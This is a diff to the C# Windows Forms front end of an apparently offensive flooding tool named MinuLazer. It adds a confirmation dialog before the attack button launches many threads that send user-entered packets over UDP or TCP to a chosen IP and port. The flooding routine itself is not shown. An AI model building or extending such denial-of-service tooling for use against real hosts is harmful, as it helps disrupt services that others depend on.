@@ -28,29 +28,43 @@ namespace MinuLazer.Forms
 
         private void attackButton_Click(object sender, EventArgs e)
         {
-            logBox.Text += Environment.NewLine + "[*] Attack Start";
-            stateLogBox.Text = "Shooting to " + ipBox.Text + ":" + portBox.Text;
+            DialogResult msg = MessageBox.Show
+            (
+                " Target: " + ipBox.Text + ":" + portBox.Text
+                + Environment.NewLine + " Thread: " + threadBox.Text
+                + Environment.NewLine + " Packet: " + packetBox.Text
+                + Environment.NewLine
+                + Environment.NewLine + " Press [OK] Button to Attack"
+                + Environment.NewLine + " Press [Cancel] Button to Calcel"
+                , " Attack Start", MessageBoxButtons.OKCancel
+            );
 
-            attackButton.Enabled = false;
-            stopButton.Enabled = true;
-
-            for (int i = 0; i < (Int32.Parse(threadBox.Text) + 1); i++)
+            if (msg == DialogResult.OK)
             {
-                if (methodBox.Text == "UDP" || methodBox.Text == "udp")
+                logBox.Text += Environment.NewLine + "[*] Attack Start";
+                stateLogBox.Text = "Shooting to " + ipBox.Text + ":" + portBox.Text;
+
+                attackButton.Enabled = false;
+                stopButton.Enabled = true;
+
+                for (int i = 0; i < (Int32.Parse(threadBox.Text) + 1); i++)
                 {
-                    Thread attack = new Thread(() => lazer.Shoot(ipBox.Text, Int32.Parse(portBox.Text),
-                        Encoding.UTF8.GetBytes(packetBox.Text), methods.METHOD_UDP)
-                    );
-                    attack.Start();
+                    if (methodBox.Text == "UDP" || methodBox.Text == "udp")
+                    {
+                        Thread attack = new Thread(() => lazer.Shoot(ipBox.Text, Int32.Parse(portBox.Text),
+                            Encoding.UTF8.GetBytes(packetBox.Text), methods.METHOD_UDP)
+                        );
+                        attack.Start();
+                    }
+                    else if (methodBox.Text == "TCP" || methodBox.Text == "tcp")
+                    {
+                        Thread attack = new Thread(() => lazer.Shoot(ipBox.Text, Int32.Parse(portBox.Text),
+                            Encoding.UTF8.GetBytes(packetBox.Text), methods.METHOD_TCP)
+                        );
+                        attack.Start();
+                    }
+                    threadLogBox.Text = "Thread: " + i.ToString();
                 }
-                else if (methodBox.Text == "TCP" || methodBox.Text == "tcp")
-                {
-                    Thread attack = new Thread(() => lazer.Shoot(ipBox.Text, Int32.Parse(portBox.Text),
-                        Encoding.UTF8.GetBytes(packetBox.Text), methods.METHOD_TCP)
-                    );
-                    attack.Start();
-                }
-                threadLogBox.Text = "Thread: " + i.ToString();
             }
         }
 
@@ -73,7 +87,6 @@ namespace MinuLazer.Forms
         private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
         {
             Process.Start("https://github.com/seungyup26/minulazer");
-
         }
 
         private void minimizeButton_Click(object sender, EventArgs e)
